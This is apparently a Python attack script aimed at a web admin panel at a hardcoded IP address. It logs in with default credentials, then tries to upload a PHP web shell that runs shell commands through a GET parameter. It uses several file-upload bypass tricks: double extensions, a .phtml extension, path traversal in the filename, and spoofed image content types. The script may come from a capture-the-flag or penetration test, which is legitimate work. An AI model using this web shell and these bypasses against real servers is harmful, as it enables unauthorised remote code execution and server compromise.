import urllib.request, urllib.parse, http.cookiejar, re, uuid

BASE = "http://103.163.47.230:33662"
cj = http.cookiejar.CookieJar()
op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))
op.addheaders = [("User-Agent", "Mozilla/5.0")]


def req(p, data=None, method=None, hdrs=None, ctype=None):
    h = {}
    if isinstance(data, dict):
        data = urllib.parse.urlencode(data).encode()
        ctype = ctype or "application/x-www-form-urlencoded"
    if data is not None:
        h["Content-Type"] = ctype or "application/x-www-form-urlencoded"
    h.update(hdrs or {})
    r = urllib.request.Request(BASE + p, data=data, headers=h, method=method)
    try:
        resp = op.open(r, timeout=25)
        return resp.status, resp.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")


def clean(b):
    b = re.sub(r"<style.*?</style>", "", b, flags=re.S)
    return re.sub(r"\s+", " ", re.sub(r"<[^>]+>", " ", b)).strip()


# 登录
req("/admin/", {"username": "admin", "password": "admin123"}, "POST")


def upload(filename, content, field="avatar", ctype="image/png", extra=None):
    boundary = "----wb" + uuid.uuid4().hex
    body = b""
    body += f"--{boundary}\r\n".encode()
    body += f'Content-Disposition: form-data; name="{field}"; filename="{filename}"\r\n'.encode()
    body += f"Content-Type: {ctype}\r\n\r\n".encode()
    body += content + b"\r\n"
    if extra:
        for k, v in extra.items():
            body += f"--{boundary}\r\n".encode()
            body += f'Content-Disposition: form-data; name="{k}"\r\n\r\n'.encode()
            body += v.encode() + b"\r\n"
    body += f"--{boundary}--\r\n".encode()
    return req("/admin/", body, "POST", ctype=f"multipart/form-data; boundary={boundary}")


PNG = (b"\x89PNG\r\n\x1a\n" + b"\x00" * 40)
PHP = b"<?php echo 'WBTEST'; system($_GET['c']); ?>"

tests = [
    ("normal.png", PNG, "image/png"),
    ("t.php", PHP, "application/octet-stream"),
    ("t.php.png", PHP, "image/png"),
    ("t.png.php", PHP, "image/png"),
    ("../t2.php", PHP, "image/png"),
    ("t.phtml", PHP, "image/png"),
    ("t.svg", b'<?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg"><text>hi</text></svg>', "image/svg+xml"),
]
for fn, content, ct in tests:
    s, b = upload(fn, content, ctype=ct)
    t = clean(b)
    m = re.search(r'src="([^"]*avatar[^"]*|/uploads/[^"]*)"', b)
    print(f"=== {fn:16s} ({ct}) -> {s}")
    print("   msg:", t[:230])
    print("   avatar src:", m.group(1) if m else "-")
    for mm in re.finditer(r"(上传|同步|失败|错误|不支持|拒绝)[^<>]{0,60}", t):
        print("   *", mm.group(0))
